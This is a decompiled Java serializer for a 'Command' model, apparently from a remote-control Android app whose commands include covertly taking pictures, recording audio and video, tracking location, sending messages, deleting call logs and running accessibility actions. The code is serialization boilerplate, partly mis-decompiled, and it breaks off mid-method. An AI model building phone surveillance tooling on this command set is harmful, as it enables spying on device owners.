package com.hawkshaw.library.datalayer.models;

import D3.b;
import E3.C0029h0;
import E3.H;
import E3.V;
import Y1.K;
import com.hawkshaw.library.datalayer.network.twirp.CommandTypeSerializer;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import kotlinx.serialization.encoding.Encoder;
import kotlinx.serialization.internal.PluginGeneratedSerialDescriptor;
import w3.w;

public final class Command$$serializer implements H {
    public static final Command$$serializer INSTANCE;
    private static final /* synthetic */ PluginGeneratedSerialDescriptor descriptor;

    static {
        Command$$serializer command$$serializer = new Command$$serializer();
        INSTANCE = command$$serializer;
        PluginGeneratedSerialDescriptor pluginGeneratedSerialDescriptor = new PluginGeneratedSerialDescriptor("com.hawkshaw.library.datalayer.models.Command", command$$serializer, 30);
        pluginGeneratedSerialDescriptor.l("type", true);
        pluginGeneratedSerialDescriptor.l("sent_time", true);
        pluginGeneratedSerialDescriptor.l("thumbnail_request", true);
        pluginGeneratedSerialDescriptor.l("file_request", true);
        pluginGeneratedSerialDescriptor.l("files_request", true);
        pluginGeneratedSerialDescriptor.l("delete_pending_push_files_request", true);
        pluginGeneratedSerialDescriptor.l("delete_file_request", true);
        pluginGeneratedSerialDescriptor.l("add_call_log_request", true);
        pluginGeneratedSerialDescriptor.l("delete_call_log_request", true);
        pluginGeneratedSerialDescriptor.l("add_contact_request", true);
        pluginGeneratedSerialDescriptor.l("delete_contact_request", true);
        pluginGeneratedSerialDescriptor.l("send_message_request", true);
        pluginGeneratedSerialDescriptor.l("get_location_request", true);
        pluginGeneratedSerialDescriptor.l("vibrate_request", true);
        pluginGeneratedSerialDescriptor.l("flash_request", true);
        pluginGeneratedSerialDescriptor.l("take_picture_request", true);
        pluginGeneratedSerialDescriptor.l("record_video_request", true);
        pluginGeneratedSerialDescriptor.l("record_audio_request", true);
        pluginGeneratedSerialDescriptor.l("device_info_request", true);
        pluginGeneratedSerialDescriptor.l("open_app_request", true);
        pluginGeneratedSerialDescriptor.l("make_call_request", true);
        pluginGeneratedSerialDescriptor.l("set_device_audio_request", true);
        pluginGeneratedSerialDescriptor.l("open_deeplink_request", true);
        pluginGeneratedSerialDescriptor.l("login_request", true);
        pluginGeneratedSerialDescriptor.l("schedule_command_request", true);
        pluginGeneratedSerialDescriptor.l("cancel_scheduled_command_request", true);
        pluginGeneratedSerialDescriptor.l("accessibility_command_request", true);
        pluginGeneratedSerialDescriptor.l("start_repeat_push_data_request", true);
        pluginGeneratedSerialDescriptor.l("set_dynamic_config_request", true);
        pluginGeneratedSerialDescriptor.l("sync_app_config_request", true);
        descriptor = pluginGeneratedSerialDescriptor;
    }

    private Command$$serializer() {
    }

    public KSerializer[] childSerializers() {
        KSerializer n4 = w.n(Command$ThumbnailRequest$$serializer.INSTANCE);
        KSerializer n5 = w.n(Command$FileRequest$$serializer.INSTANCE);
        KSerializer n6 = w.n(Command$FilesRequest$$serializer.INSTANCE);
        KSerializer n7 = w.n(Command$DeletePendingPushFilesRequest$$serializer.INSTANCE);
        KSerializer n8 = w.n(Command$DeleteFileRequest$$serializer.INSTANCE);
        KSerializer n9 = w.n(Command$AddCallLogRequest$$serializer.INSTANCE);
        KSerializer n10 = w.n(Command$DeleteCallLogRequest$$serializer.INSTANCE);
        KSerializer n11 = w.n(Command$AddContactRequest$$serializer.INSTANCE);
        KSerializer n12 = w.n(Command$DeleteContactRequest$$serializer.INSTANCE);
        KSerializer n13 = w.n(Command$SendMessageRequest$$serializer.INSTANCE);
        KSerializer n14 = w.n(Command$GetLocationRequest$$serializer.INSTANCE);
        KSerializer n15 = w.n(Command$VibrateRequest$$serializer.INSTANCE);
        KSerializer n16 = w.n(Command$FlashRequest$$serializer.INSTANCE);
        KSerializer n17 = w.n(Command$TakePictureRequest$$serializer.INSTANCE);
        KSerializer n18 = w.n(Command$RecordVideoRequest$$serializer.INSTANCE);
        KSerializer n19 = w.n(Command$RecordAudioRequest$$serializer.INSTANCE);
        KSerializer kSerializer = n19;
        return new KSerializer[]{CommandTypeSerializer.INSTANCE, V.f466a, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, kSerializer, w.n(Command$PushDeviceInfoRequest$$serializer.INSTANCE), w.n(Command$OpenAppRequest$$serializer.INSTANCE), w.n(Command$MakeCallRequest$$serializer.INSTANCE), w.n(Command$DeviceAudioRequest$$serializer.INSTANCE), w.n(Command$OpenDeeplinkRequest$$serializer.INSTANCE), w.n(Command$LoginRequest$$serializer.INSTANCE), w.n(Command$ScheduleCommandRequest$$serializer.INSTANCE), w.n(Command$CancelScheduledCommandRequest$$serializer.INSTANCE), w.n(Command$AccessibilityCommandRequest$$serializer.INSTANCE), w.n(Command$StartRepeatPushDataRequest$$serializer.INSTANCE), w.n(Command$SetDynamicConfigRequest$$serializer.INSTANCE), w.n(Command$SyncAppConfigRequest$$serializer.INSTANCE)};
    }

    /* JADX WARNING: Code restructure failed: missing block: B:20:0x0115, code lost:
        r2 = r38;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:22:0x012f, code lost:
        r15 = r37;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:31:0x0202, code lost:
        r28 = r3;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:32:0x0205, code lost:
        r3 = r39;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:37:0x02d6, code lost:
        r24 = r4;
        r4 = r29;
        r29 = r47;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:39:0x031a, code lost:
        r23 = r2;
        r2 = r38;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:42:0x0397, code lost:
        r12 = r21;
        r7 = r28;
        r15 = r37;
        r6 = r41;
        r5 = r42;
        r21 = r13;
        r13 = r22;
        r28 = r23;
        r23 = r2;
        r22 = r3;
        r2 = r38;
        r3 = r39;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:45:0x0438, code lost:
        r24 = r4;
        r4 = r29;
        r29 = r47;
        r48 = r19;
        r19 = r9;
        r9 = r48;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:47:0x048d, code lost:
        r14 = r36;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:7:0x0063, code lost:
        r8 = r8 | r14;
        r15 = r37;
     */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public com.hawkshaw.library.datalayer.models.Command deserialize(kotlinx.serialization.encoding.Decoder r50) {
        /*
            r49 = this;
            r0 = r50
            java.lang.String r1 = "decoder"
            Y1.K.n(r0, r1)
            kotlinx.serialization.descriptors.SerialDescriptor r1 = r49.getDescriptor()
            D3.a r0 = r0.a(r1)
            r4 = 0
            r5 = 0
            r2 = r4
            r3 = r2
            r7 = r3
            r9 = r7
            r10 = r9
            r11 = r10
            r12 = r11
            r13 = r12
            r14 = r13
            r15 = r14
            r19 = r15
            r20 = r19
            r21 = r20
            r22 = r21
            r23 = r22
            r24 = r23
            r25 = r24
            r26 = r25
            r27 = r26
            r28 = r27
            r29 = r28
            r30 = r29
            r31 = r30
            r32 = r31
            r33 = r32
            r34 = r33
            r17 = r5
            r8 = 0
            r35 = 1
            r5 = r34
            r6 = r5
        L_0x0044:
            if (r35 == 0) goto L_0x0491
            r36 = r14
            int r14 = r0.y(r1)
            switch(r14) {
                case -1: goto L_0x0445;
                case 0: goto L_0x03e4;
                case 1: goto L_0x03b2;
                case 2: goto L_0x0362;
                case 3: goto L_0x031f;
                case 4: goto L_0x02de;
                case 5: goto L_0x029a;
                case 6: goto L_0x0260;
                case 7: goto L_0x0232;
                case 8: goto L_0x0209;
                case 9: goto L_0x01e0;
                case 10: goto L_0x01c0;
                case 11: goto L_0x01a8;
                case 12: goto L_0x0191;
                case 13: goto L_0x017a;
                case 14: goto L_0x0163;
                case 15: goto L_0x014a;
                case 16: goto L_0x0132;
                case 17: goto L_0x0119;
                case 18: goto L_0x0101;
                case 19: goto L_0x00f1;
                case 20: goto L_0x00e1;
                case 21: goto L_0x00d2;
                case 22: goto L_0x00c3;
                case 23: goto L_0x00b4;
                case 24: goto L_0x00a5;
                case 25: goto L_0x0096;
                case 26: goto L_0x0087;
                case 27: goto L_0x0078;
                case 28: goto L_0x0069;
                case 29: goto L_0x0055;
                default: goto L_0x004f;
            }
        L_0x004f:
            B3.m r0 = new B3.m
            r0.<init>(r14)
            throw r0
        L_0x0055:
            r14 = 29
            r37 = r15
            com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest$$serializer r15 = com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest$$serializer.INSTANCE
            java.lang.Object r13 = r0.f(r1, r14, r15, r13)
            com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest r13 = (com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest) r13
            r14 = 536870912(0x20000000, float:1.0842022E-19)
        L_0x0063:
            r8 = r8 | r14
            r15 = r37
        L_0x0066:
            r14 = 0
            goto L_0x048d
        L_0x0069:
            r37 = r15
            r14 = 28
            com.hawkshaw.library.datalayer.models.Command$SetDynamicConfigRequest$$serializer r15 = com.hawkshaw.library.datalayer.models.Command$SetDynamicConfigRequest$$serializer.INSTANCE
            java.lang.Object r12 = r0.f(r1, r14, r15, r12)
            com.hawkshaw.library.datalayer.models.Command$SetDynamicConfigRequest r12 = (com.hawkshaw.library.datalayer.models.Command.SetDynamicConfigRequest) r12
            r14 = 268435456(0x10000000, float:2.524355E-29)
            goto L_0x0063
        L_0x0078:
            r37 = r15
            r14 = 27
            com.hawkshaw.library.datalayer.models.Command$StartRepeatPushDataRequest$$serializer r15 = com.hawkshaw.library.datalayer.models.Command$StartRepeatPushDataRequest$$serializer.INSTANCE
            java.lang.Object r9 = r0.f(r1, r14, r15, r9)
            com.hawkshaw.library.datalayer.models.Command$StartRepeatPushDataRequest r9 = (com.hawkshaw.library.datalayer.models.Command.StartRepeatPushDataRequest) r9
            r14 = 134217728(0x8000000, float:3.85186E-34)
            goto L_0x0063
        L_0x0087:
            r37 = r15
            r14 = 26
            com.hawkshaw.library.datalayer.models.Command$AccessibilityCommandRequest$$serializer r15 = com.hawkshaw.library.datalayer.models.Command$AccessibilityCommandRequest$$serializer.INSTANCE
            java.lang.Object r11 = r0.f(r1, r14, r15, r11)
            com.hawkshaw.library.datalayer.models.Command$AccessibilityCommandRequest r11 = (com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest) r11
            r14 = 67108864(0x4000000, float:1.5046328E-36)
            goto L_0x0063
        L_0x0096:
            r37 = r15
            r14 = 25
            com.hawkshaw.library.datalayer.models.Command$CancelScheduledCommandRequest$$serializer r15 = com.hawkshaw.library.datalayer.models.Command$CancelScheduledCommandRequest$$serializer.INSTANCE
            java.lang.Object r10 = r0.f(r1, r14, r15, r10)
            com.hawkshaw.library.datalayer.models.Command$CancelScheduledCommandRequest r10 = (com.hawkshaw.library.datalayer.models.Command.CancelScheduledCommandRequest) r10
            r14 = 33554432(0x2000000, float:9.403955E-38)
            goto L_0x0063
        L_0x00a5:
            r37 = r15
            r14 = 24
            com.hawkshaw.library.datalayer.models.Command$ScheduleCommandRequest$$serializer r15 = com.hawkshaw.library.datalayer.models.Command$ScheduleCommandRequest$$serializer.INSTANCE
            java.lang.Object r2 = r0.f(r1, r14, r15, r2)
            com.hawkshaw.library.datalayer.models.Command$ScheduleCommandRequest r2 = (com.hawkshaw.library.datalayer.models.Command.ScheduleCommandRequest) r2
            r14 = 16777216(0x1000000, float:2.3509887E-38)
            goto L_0x0063
        L_0x00b4:
            r37 = r15
            r14 = 23
            com.hawkshaw.library.datalayer.models.Command$LoginRequest$$serializer r15 = com.hawkshaw.library.datalayer.models.Command$LoginRequest$$serializer.INSTANCE
            java.lang.Object r3 = r0.f(r1, r14, r15, r3)
            com.hawkshaw.library.datalayer.models.Command$LoginRequest r3 = (com.hawkshaw.library.datalayer.models.Command.LoginRequest) r3
            r14 = 8388608(0x800000, float:1.1754944E-38)
            goto L_0x0063
        L_0x00c3:
            r37 = r15
            r14 = 22
            com.hawkshaw.library.datalayer.models.Command$OpenDeeplinkRequest$$serializer r15 = com.hawkshaw.library.datalayer.models.Command$OpenDeeplinkRequest$$serializer.INSTANCE
            java.lang.Object r7 = r0.f(r1, r14, r15, r7)
            com.hawkshaw.library.datalayer.models.Command$OpenDeeplinkRequest r7 = (com.hawkshaw.library.datalayer.models.Command.OpenDeeplinkRequest) r7
            r14 = 4194304(0x400000, float:5.877472E-39)
            goto L_0x0063
        L_0x00d2:
            r37 = r15
            r14 = 21
            com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest$$serializer r15 = com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest$$serializer.INSTANCE
            java.lang.Object r6 = r0.f(r1, r14, r15, r6)
            com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest r6 = (com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest) r6
            r14 = 2097152(0x200000, float:2.938736E-39)
            goto L_0x0063
        L_0x00e1:
            r37 = r15
            com.hawkshaw.library.datalayer.models.Command$MakeCallRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$MakeCallRequest$$serializer.INSTANCE
            r15 = 20
            java.lang.Object r5 = r0.f(r1, r15, r14, r5)
            com.hawkshaw.library.datalayer.models.Command$MakeCallRequest r5 = (com.hawkshaw.library.datalayer.models.Command.MakeCallRequest) r5
            r14 = 1048576(0x100000, float:1.469368E-39)
            goto L_0x0063
        L_0x00f1:
            r37 = r15
            com.hawkshaw.library.datalayer.models.Command$OpenAppRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$OpenAppRequest$$serializer.INSTANCE
            r15 = 19
            java.lang.Object r4 = r0.f(r1, r15, r14, r4)
            com.hawkshaw.library.datalayer.models.Command$OpenAppRequest r4 = (com.hawkshaw.library.datalayer.models.Command.OpenAppRequest) r4
            r14 = 524288(0x80000, float:7.34684E-40)
            goto L_0x0063
        L_0x0101:
            r37 = r15
            com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest$$serializer.INSTANCE
            r15 = 18
            r38 = r2
            r2 = r37
            java.lang.Object r2 = r0.f(r1, r15, r14, r2)
            com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest r2 = (com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest) r2
            r14 = 262144(0x40000, float:3.67342E-40)
            r8 = r8 | r14
            r15 = r2
        L_0x0115:
            r2 = r38
            goto L_0x0066
        L_0x0119:
            r38 = r2
            r2 = r15
            com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$$serializer.INSTANCE
            r15 = 17
            r37 = r2
            r2 = r36
            java.lang.Object r2 = r0.f(r1, r15, r14, r2)
            com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest r2 = (com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest) r2
            r14 = 131072(0x20000, float:1.83671E-40)
            r8 = r8 | r14
            r36 = r2
        L_0x012f:
            r15 = r37
            goto L_0x0115
        L_0x0132:
            r38 = r2
            r37 = r15
            r2 = r36
            com.hawkshaw.library.datalayer.models.Command$RecordVideoRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$RecordVideoRequest$$serializer.INSTANCE
            r15 = 16
            r2 = r34
            java.lang.Object r2 = r0.f(r1, r15, r14, r2)
            com.hawkshaw.library.datalayer.models.Command$RecordVideoRequest r2 = (com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest) r2
            r14 = 65536(0x10000, float:9.1835E-41)
            r8 = r8 | r14
            r34 = r2
            goto L_0x012f
        L_0x014a:
            r38 = r2
            r37 = r15
            r2 = r34
            com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$$serializer.INSTANCE
            r15 = 15
            r2 = r33
            java.lang.Object r2 = r0.f(r1, r15, r14, r2)
            com.hawkshaw.library.datalayer.models.Command$TakePictureRequest r2 = (com.hawkshaw.library.datalayer.models.Command.TakePictureRequest) r2
            r14 = 32768(0x8000, float:4.5918E-41)
            r8 = r8 | r14
            r33 = r2
            goto L_0x012f
        L_0x0163:
            r38 = r2
            r37 = r15
            r2 = r33
            com.hawkshaw.library.datalayer.models.Command$FlashRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$FlashRequest$$serializer.INSTANCE
            r15 = 14
            r2 = r32
            java.lang.Object r2 = r0.f(r1, r15, r14, r2)
            com.hawkshaw.library.datalayer.models.Command$FlashRequest r2 = (com.hawkshaw.library.datalayer.models.Command.FlashRequest) r2
            r8 = r8 | 16384(0x4000, float:2.2959E-41)
            r32 = r2
            goto L_0x012f
        L_0x017a:
            r38 = r2
            r37 = r15
            r2 = r32
            com.hawkshaw.library.datalayer.models.Command$VibrateRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$VibrateRequest$$serializer.INSTANCE
            r15 = 13
            r2 = r31
            java.lang.Object r2 = r0.f(r1, r15, r14, r2)
            com.hawkshaw.library.datalayer.models.Command$VibrateRequest r2 = (com.hawkshaw.library.datalayer.models.Command.VibrateRequest) r2
            r8 = r8 | 8192(0x2000, float:1.148E-41)
            r31 = r2
            goto L_0x012f
        L_0x0191:
            r38 = r2
            r37 = r15
            r2 = r31
            com.hawkshaw.library.datalayer.models.Command$GetLocationRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$GetLocationRequest$$serializer.INSTANCE
            r15 = 12
            r2 = r30
            java.lang.Object r2 = r0.f(r1, r15, r14, r2)
            com.hawkshaw.library.datalayer.models.Command$GetLocationRequest r2 = (com.hawkshaw.library.datalayer.models.Command.GetLocationRequest) r2
            r8 = r8 | 4096(0x1000, float:5.74E-42)
            r30 = r2
            goto L_0x012f
        L_0x01a8:
            r38 = r2
            r37 = r15
            r2 = r30
            com.hawkshaw.library.datalayer.models.Command$SendMessageRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$SendMessageRequest$$serializer.INSTANCE
            r15 = 11
            r2 = r29
            java.lang.Object r2 = r0.f(r1, r15, r14, r2)
            com.hawkshaw.library.datalayer.models.Command$SendMessageRequest r2 = (com.hawkshaw.library.datalayer.models.Command.SendMessageRequest) r2
            r8 = r8 | 2048(0x800, float:2.87E-42)
            r29 = r2
            goto L_0x012f
        L_0x01c0:
            r38 = r2
            r37 = r15
            r2 = r29
            com.hawkshaw.library.datalayer.models.Command$DeleteContactRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$DeleteContactRequest$$serializer.INSTANCE
            r15 = 10
            r39 = r3
            r3 = r28
            java.lang.Object r3 = r0.f(r1, r15, r14, r3)
            com.hawkshaw.library.datalayer.models.Command$DeleteContactRequest r3 = (com.hawkshaw.library.datalayer.models.Command.DeleteContactRequest) r3
            r8 = r8 | 1024(0x400, float:1.435E-42)
            r28 = r3
            r15 = r37
            r2 = r38
            r3 = r39
            goto L_0x0066
        L_0x01e0:
            r38 = r2
            r39 = r3
            r37 = r15
            r3 = r28
            r2 = r29
            com.hawkshaw.library.datalayer.models.Command$AddContactRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$AddContactRequest$$serializer.INSTANCE
            r15 = 9
            r28 = r7
            r7 = r27
            java.lang.Object r7 = r0.f(r1, r15, r14, r7)
            com.hawkshaw.library.datalayer.models.Command$AddContactRequest r7 = (com.hawkshaw.library.datalayer.models.Command.AddContactRequest) r7
            r8 = r8 | 512(0x200, float:7.17E-43)
            r27 = r7
            r7 = r28
            r15 = r37
            r2 = r38
        L_0x0202:
            r14 = 0
            r28 = r3
        L_0x0205:
            r3 = r39
            goto L_0x048d
        L_0x0209:
            r38 = r2
            r39 = r3
            r37 = r15
            r3 = r28
            r2 = r29
            r28 = r7
            r7 = r27
            com.hawkshaw.library.datalayer.models.Command$DeleteCallLogRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$DeleteCallLogRequest$$serializer.INSTANCE
            r15 = 8
            r41 = r6
            r6 = r26
            java.lang.Object r6 = r0.f(r1, r15, r14, r6)
            com.hawkshaw.library.datalayer.models.Command$DeleteCallLogRequest r6 = (com.hawkshaw.library.datalayer.models.Command.DeleteCallLogRequest) r6
            r8 = r8 | 256(0x100, float:3.59E-43)
            r26 = r6
            r7 = r28
            r15 = r37
            r2 = r38
            r6 = r41
            goto L_0x0202
        L_0x0232:
            r38 = r2
            r39 = r3
            r41 = r6
            r37 = r15
            r6 = r26
            r3 = r28
            r2 = r29
            r28 = r7
            r7 = r27
            com.hawkshaw.library.datalayer.models.Command$AddCallLogRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$AddCallLogRequest$$serializer.INSTANCE
            r15 = 7
            r42 = r5
            r5 = r25
            java.lang.Object r5 = r0.f(r1, r15, r14, r5)
            com.hawkshaw.library.datalayer.models.Command$AddCallLogRequest r5 = (com.hawkshaw.library.datalayer.models.Command.AddCallLogRequest) r5
            r8 = r8 | 128(0x80, float:1.8E-43)
            r25 = r5
            r7 = r28
            r15 = r37
            r2 = r38
            r6 = r41
            r5 = r42
            goto L_0x0202
        L_0x0260:
            r38 = r2
            r39 = r3
            r42 = r5
            r41 = r6
            r37 = r15
            r5 = r25
            r6 = r26
            r3 = r28
            r2 = r29
            r28 = r7
            r7 = r27
            com.hawkshaw.library.datalayer.models.Command$DeleteFileRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$DeleteFileRequest$$serializer.INSTANCE
            r15 = 6
            r29 = r4
            r4 = r24
            java.lang.Object r4 = r0.f(r1, r15, r14, r4)
            com.hawkshaw.library.datalayer.models.Command$DeleteFileRequest r4 = (com.hawkshaw.library.datalayer.models.Command.DeleteFileRequest) r4
            r8 = r8 | 64
            r24 = r4
            r7 = r28
            r4 = r29
            r15 = r37
            r6 = r41
            r5 = r42
            r14 = 0
            r29 = r2
            r28 = r3
            r2 = r38
            goto L_0x0205
        L_0x029a:
            r38 = r2
            r39 = r3
            r42 = r5
            r41 = r6
            r37 = r15
            r5 = r25
            r6 = r26
            r3 = r28
            r2 = r29
            r29 = r4
            r28 = r7
            r4 = r24
            r7 = r27
            com.hawkshaw.library.datalayer.models.Command$DeletePendingPushFilesRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$DeletePendingPushFilesRequest$$serializer.INSTANCE
            r15 = 5
            r24 = r2
            r2 = r23
            java.lang.Object r2 = r0.f(r1, r15, r14, r2)
            com.hawkshaw.library.datalayer.models.Command$DeletePendingPushFilesRequest r2 = (com.hawkshaw.library.datalayer.models.Command.DeletePendingPushFilesRequest) r2
            r8 = r8 | 32
            r23 = r2
            r7 = r28
            r15 = r37
            r2 = r38
            r6 = r41
            r5 = r42
            r14 = 0
            r28 = r3
            r3 = r39
            r47 = r24
        L_0x02d6:
            r24 = r4
            r4 = r29
            r29 = r47
            goto L_0x048d
        L_0x02de:
            r38 = r2
            r39 = r3
            r42 = r5
            r41 = r6
            r37 = r15
            r2 = r23
            r5 = r25
            r6 = r26
            r3 = r28
            r28 = r7
            r7 = r27
            r47 = r29
            r29 = r4
            r4 = r24
            r24 = r47
            com.hawkshaw.library.datalayer.models.Command$FilesRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$FilesRequest$$serializer.INSTANCE
            r15 = 4
            r23 = r3
            r3 = r22
            java.lang.Object r3 = r0.f(r1, r15, r14, r3)
            com.hawkshaw.library.datalayer.models.Command$FilesRequest r3 = (com.hawkshaw.library.datalayer.models.Command.FilesRequest) r3
            r8 = r8 | 16
            r22 = r3
            r7 = r28
            r15 = r37
            r3 = r39
            r6 = r41
            r5 = r42
            r14 = 0
            r28 = r23
        L_0x031a:
            r23 = r2
            r2 = r38
            goto L_0x02d6
        L_0x031f:
            r38 = r2
            r39 = r3
            r42 = r5
            r41 = r6
            r37 = r15
            r3 = r22
            r2 = r23
            r5 = r25
            r6 = r26
            r23 = r28
            r28 = r7
            r7 = r27
            r47 = r29
            r29 = r4
            r4 = r24
            r24 = r47
            com.hawkshaw.library.datalayer.models.Command$FileRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$FileRequest$$serializer.INSTANCE
            r15 = 3
            r22 = r13
            r13 = r21
            java.lang.Object r13 = r0.f(r1, r15, r14, r13)
            com.hawkshaw.library.datalayer.models.Command$FileRequest r13 = (com.hawkshaw.library.datalayer.models.Command.FileRequest) r13
            r8 = r8 | 8
            r21 = r13
            r13 = r22
            r7 = r28
            r15 = r37
            r6 = r41
            r5 = r42
            r14 = 0
            r22 = r3
            r28 = r23
            r3 = r39
            goto L_0x031a
        L_0x0362:
            r38 = r2
            r39 = r3
            r42 = r5
            r41 = r6
            r37 = r15
            r3 = r22
            r2 = r23
            r5 = r25
            r6 = r26
            r23 = r28
            r28 = r7
            r22 = r13
            r13 = r21
            r7 = r27
            r47 = r29
            r29 = r4
            r4 = r24
            r24 = r47
            com.hawkshaw.library.datalayer.models.Command$ThumbnailRequest$$serializer r14 = com.hawkshaw.library.datalayer.models.Command$ThumbnailRequest$$serializer.INSTANCE
            r15 = 2
            r21 = r12
            r12 = r20
            java.lang.Object r12 = r0.f(r1, r15, r14, r12)
            com.hawkshaw.library.datalayer.models.Command$ThumbnailRequest r12 = (com.hawkshaw.library.datalayer.models.Command.ThumbnailRequest) r12
            r8 = r8 | 4
            r20 = r12
        L_0x0397:
            r12 = r21
            r7 = r28
            r15 = r37
            r6 = r41
            r5 = r42
            r14 = 0
            r21 = r13
            r13 = r22
            r28 = r23
            r23 = r2
            r22 = r3
            r2 = r38
            r3 = r39
            goto L_0x02d6
        L_0x03b2:
            r38 = r2
            r39 = r3
            r42 = r5
            r41 = r6
            r37 = r15
            r3 = r22
            r2 = r23
            r5 = r25
            r6 = r26
            r23 = r28
            r14 = 1
            r28 = r7
            r22 = r13
            r13 = r21
            r7 = r27
            r21 = r12
            r12 = r20
            r47 = r29
            r29 = r4
            r4 = r24
            r24 = r47
            long r15 = r0.D(r1, r14)
            r8 = r8 | 2
            r17 = r15
            goto L_0x0397
        L_0x03e4:
            r38 = r2
            r39 = r3
            r42 = r5
            r41 = r6
            r37 = r15
            r3 = r22
            r2 = r23
            r5 = r25
            r6 = r26
            r23 = r28
            r14 = 1
            r28 = r7
            r22 = r13
            r13 = r21
            r7 = r27
            r21 = r12
            r12 = r20
            r47 = r29
            r29 = r4
            r4 = r24
            r24 = r47
            com.hawkshaw.library.datalayer.network.twirp.CommandTypeSerializer r15 = com.hawkshaw.library.datalayer.network.twirp.CommandTypeSerializer.INSTANCE
            r14 = 0
            r47 = r19
            r19 = r9
            r9 = r47
            java.lang.Object r9 = r0.l(r1, r14, r15, r9)
            com.hawkshaw.library.datalayer.models.Command$CommandType r9 = (com.hawkshaw.library.datalayer.models.Command.CommandType) r9
            r8 = r8 | 1
            r12 = r21
            r7 = r28
            r15 = r37
            r6 = r41
            r5 = r42
            r21 = r13
            r13 = r22
            r28 = r23
            r23 = r2
            r22 = r3
            r2 = r38
            r3 = r39
            r47 = r24
        L_0x0438:
            r24 = r4
            r4 = r29
            r29 = r47
            r48 = r19
            r19 = r9
            r9 = r48
            goto L_0x048d
        L_0x0445:
            r38 = r2
            r39 = r3
            r42 = r5
            r41 = r6
            r37 = r15
            r3 = r22
            r2 = r23
            r5 = r25
            r6 = r26
            r23 = r28
            r14 = 0
            r28 = r7
            r22 = r13
            r13 = r21
            r7 = r27
            r21 = r12
            r12 = r20
            r47 = r29
            r29 = r4
            r4 = r24
            r24 = r47
            r48 = r19
            r19 = r9
            r9 = r48
            r35 = r14
            r12 = r21
            r7 = r28
            r6 = r41
            r5 = r42
            r21 = r13
            r13 = r22
            r28 = r23
            r23 = r2
            r22 = r3
            r2 = r38
            r3 = r39
            goto L_0x0438
        L_0x048d:
            r14 = r36
            goto L_0x0044
        L_0x0491:
            r38 = r2
            r39 = r3
            r42 = r5
            r41 = r6
            r36 = r14
            r37 = r15
            r3 = r22
            r2 = r23
            r5 = r25
            r6 = r26
            r23 = r28
            r28 = r7
            r22 = r13
            r13 = r21
            r7 = r27
            r21 = r12
            r12 = r20
            r47 = r29
            r29 = r4
            r4 = r24
            r24 = r47
            r48 = r19
            r19 = r9
            r9 = r48
            r0.c(r1)
            com.hawkshaw.library.datalayer.models.Command r0 = new com.hawkshaw.library.datalayer.models.Command
            r1 = r28
            r7 = r0
            r40 = 0
            r43 = r19
            r35 = r10
            r44 = r11
            r10 = r17
            r45 = r21
            r46 = r22
            r14 = r3
            r3 = r37
            r15 = r2
            r16 = r4
            r17 = r5
            r18 = r6
            r19 = r27
            r20 = r23
            r21 = r24
            r22 = r30
            r23 = r31
            r24 = r32
            r25 = r33
            r26 = r34
            r27 = r36
            r28 = r3
            r30 = r42
            r31 = r41
            r32 = r1
            r33 = r39
            r34 = r38
            r36 = r44
            r37 = r43
            r38 = r45
            r39 = r46
